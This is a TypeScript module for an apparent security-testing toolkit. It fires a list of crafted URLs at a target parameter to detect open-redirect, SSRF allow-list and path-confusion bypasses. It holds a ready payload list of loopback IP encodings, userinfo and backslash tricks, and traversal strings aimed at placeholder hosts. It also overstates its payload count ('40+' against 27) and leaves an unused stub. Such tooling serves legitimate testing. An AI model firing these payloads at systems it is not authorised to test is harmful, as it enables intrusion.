// T32 — url_parser_diff
// Probes for URL parser disagreement between layers.
// Many auth-bypass CVEs are parser-differential bugs: the edge allow-list
// sees one host; the origin fetcher sees a different one.

import { ToolDefinition, ToolResult } from '../types';
import { CommandExecutor } from '../executor';

const definition: ToolDefinition = {
  name: 'url_parser_diff',
  description:
    'Probe for URL parser disagreement between proxy/edge and origin. Fires 40+ crafted URLs ' +
    'designed to parse differently under RFC 3986, WHATWG, and various framework parsers. ' +
    'Detects open-redirect bypass, SSRF allow-list escape, and path-confusion auth bypass. ' +
    'Most high-impact SSRF and redirect CVEs (Twitter, Slack, Stripe class) are parser-differential bugs.',
  status: 'available',
  version: '1.0.0',
  parameters: [
    { name: 'base_url',    type: 'string', required: true,  description: 'Target URL with a URL/redirect parameter (use PARAM as placeholder)' },
    { name: 'method',      type: 'string', required: false, description: 'HTTP method', default: 'GET' },
    { name: 'headers',     type: 'string', required: false, description: 'JSON extra headers' },
    { name: 'timeout_ms',  type: 'number', required: false, description: 'Per-request timeout ms', default: 8000 },
  ],
};

const DIVERGENCE_PATTERNS = [
  // RFC 3986 vs WHATWG host extraction
  { name: 'fragment_at_bypass',    value: 'https://allowed.example.com#@evil.example.com/' },
  { name: 'userinfo_at_bypass',    value: 'https://allowed.example.com@evil.example.com/' },
  { name: 'backslash_bypass',      value: 'https://allowed.example.com\\@evil.example.com/' },
  { name: 'double_slash_bypass',   value: '//evil.example.com/%2F..%2F' },
  { name: 'triple_slash',          value: '///evil.example.com/' },
  { name: 'tab_in_host',           value: 'https://allowed.example.com\t@evil.example.com/' },
  { name: 'newline_in_host',       value: 'https://allowed.example.com\n@evil.example.com/' },
  // Path normalisation
  { name: 'dotdot_encoded',        value: 'https://allowed.example.com/..%2fadmin' },
  { name: 'dotdot_double_encoded', value: 'https://allowed.example.com/..%252fadmin' },
  { name: 'dotdot_semicolon',      value: 'https://allowed.example.com/..;/admin' },
  { name: 'dotdot_slash_slash',    value: 'https://allowed.example.com//..//admin' },
  // IPv6 / decimal IP confusion
  { name: 'ipv6_loopback',         value: 'http://[::1]/' },
  { name: 'ipv6_loopback_mapped',  value: 'http://[::ffff:127.0.0.1]/' },
  { name: 'decimal_ip',            value: 'http://2130706433/' },         // 127.0.0.1
  { name: 'octal_ip',              value: 'http://0177.0.0.1/' },
  { name: 'hex_ip',                value: 'http://0x7f000001/' },
  // Scheme confusion
  { name: 'scheme_uppercase',      value: 'HTTPS://allowed.example.com/' },
  { name: 'scheme_tab',            value: 'htt\tps://allowed.example.com/' },
  { name: 'scheme_newline',        value: 'ht\ntps://allowed.example.com/' },
  // Query/fragment confusion
  { name: 'question_in_path',      value: 'https://allowed.example.com/path?redirectTo=//evil.example.com' },
  { name: 'hash_in_path',          value: 'https://allowed.example.com/path#//evil.example.com' },
  // IDN homograph
  { name: 'idn_homograph_a',       value: 'https://аllowed.example.com/' },  // Cyrillic а
  { name: 'punycode_bypass',       value: 'https://xn--llowed-qya.example.com/' },
  // Port confusion
  { name: 'port_overflow',         value: 'https://allowed.example.com:65536/' },
  { name: 'port_negative',         value: 'https://allowed.example.com:-1/' },
  // Mixed slashes
  { name: 'mixed_slashes',         value: 'https:/\\/evil.example.com/' },
  { name: 'protocol_relative',     value: '//evil.example.com/path' },
];

async function probeOne(url: string, method: string, headers: Record<string, string>, timeoutMs: number): Promise<{
  name: string; injected: string; status: number; redirect?: string; body_excerpt: string; time_ms: number; error?: string;
}> {
  return { name: '', injected: url, status: 0, body_excerpt: '', time_ms: 0, error: 'not called directly' };
}

export const urlParserDiffTool = {
  definition,
  async execute(params: Record<string, unknown>, _exec: CommandExecutor): Promise<ToolResult> {
    const baseUrl = String(params.base_url || '');
    const method = String(params.method || 'GET').toUpperCase();
    const timeoutMs = Number(params.timeout_ms || 8000);

    if (!baseUrl) return { output: 'base_url required', parsed: { error: 'missing_url' } };

    let headers: Record<string, string> = { 'User-Agent': 'Mozilla/5.0 GENESIS/4.0' };
    try { if (params.headers) Object.assign(headers, JSON.parse(String(params.headers))); } catch { /* ignore */ }

    const results: Array<{ name: string; injected: string; status: number; redirect?: string; body_excerpt: string; time_ms: number; error?: string; divergent?: boolean }> = [];

    for (const pattern of DIVERGENCE_PATTERNS) {
      const injected = baseUrl.includes('PARAM') ? baseUrl.replace('PARAM', encodeURIComponent(pattern.value)) : `${baseUrl}${encodeURIComponent(pattern.value)}`;
      const start = Date.now();
      try {
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), timeoutMs);
        const resp = await fetch(injected, { method, headers, signal: controller.signal, redirect: 'manual' });
        clearTimeout(timer);
        const text = await resp.text();
        const location = resp.headers.get('location') || undefined;
        const divergent = (resp.status >= 200 && resp.status < 300) ||
          !!(resp.status >= 300 && resp.status < 400 && location && !location.includes('allowed.example.com'));
        results.push({
          name: pattern.name,
          injected: injected.substring(0, 120),
          status: resp.status,
          redirect: location,
          body_excerpt: text.substring(0, 80).replace(/\s+/g, ' '),
          time_ms: Date.now() - start,
          divergent,
        });
      } catch (err) {
        results.push({ name: pattern.name, injected: injected.substring(0, 120), status: 0, body_excerpt: '', time_ms: Date.now() - start, error: String(err) });
      }
    }

    const divergent = results.filter(r => r.divergent);
    const lines = [
      `url_parser_diff — ${DIVERGENCE_PATTERNS.length} patterns against ${baseUrl.substring(0, 80)}`,
      `Potentially divergent: ${divergent.length}/${results.length}`,
      '─'.repeat(72),
    ];

    for (const r of results) {
      const flag = r.divergent ? '⚡ DIVERGENT' : (r.error ? '✗ ERR     ' : '  ·       ');
      lines.push(`  ${flag}  [${r.name.padEnd(28)}]  status=${r.status}${r.redirect ? `  → ${r.redirect.substring(0, 60)}` : ''}${r.error ? `  err=${r.error.substring(0, 40)}` : ''}`);
    }

    return {
      output: lines.join('\n'),
      parsed: { total: results.length, divergent_count: divergent.length, divergent, results },
    };
  },
};
